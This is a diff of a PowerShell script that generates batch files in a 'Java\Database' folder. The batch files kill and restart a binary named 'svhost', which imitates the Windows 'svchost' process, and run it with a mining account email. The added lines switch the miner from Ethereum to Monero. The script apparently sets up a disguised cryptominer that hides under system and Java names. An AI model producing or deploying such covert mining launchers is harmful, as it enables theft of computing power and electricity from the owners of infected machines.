@@ -48,13 +48,13 @@ cd C:\ProgramData\Java\Database
 "Taskkill /IM svhost.exe /F" | Out-File -encoding ascii jshalf.bat -append
 "cd C:\ProgramData\Java\Database" | Out-File -encoding ascii jshalf.bat -append
 "timeout /t 60" | Out-File -encoding ascii jshalf.bat -append
-"svhost -user electricconsciousness@gmail.com -eth $CPU" | Out-File -encoding ascii jshalf.bat -append
+"svhost -user electricconsciousness@gmail.com -xmr $CPU" | Out-File -encoding ascii jshalf.bat -append
  
 cd C:\ProgramData\Java\Database
 "Taskkill /IM svhost.exe /F" | Out-File -encoding ascii jsfull.bat -append
 "cd C:\ProgramData\Java\Database" | Out-File -encoding ascii jsfull.bat -append
 "timeout /t 60" | Out-File -encoding ascii jsfull.bat -append
-"svhost -user electricconsciousness@gmail.com -eth $CPUFull" | Out-File -encoding ascii jsfull.bat -append
+"svhost -user electricconsciousness@gmail.com -xmr $CPUFull" | Out-File -encoding ascii jsfull.bat -append
  
 "Taskkill /IM svhost.exe /F" | Out-File -encoding ascii Kill.bat
  
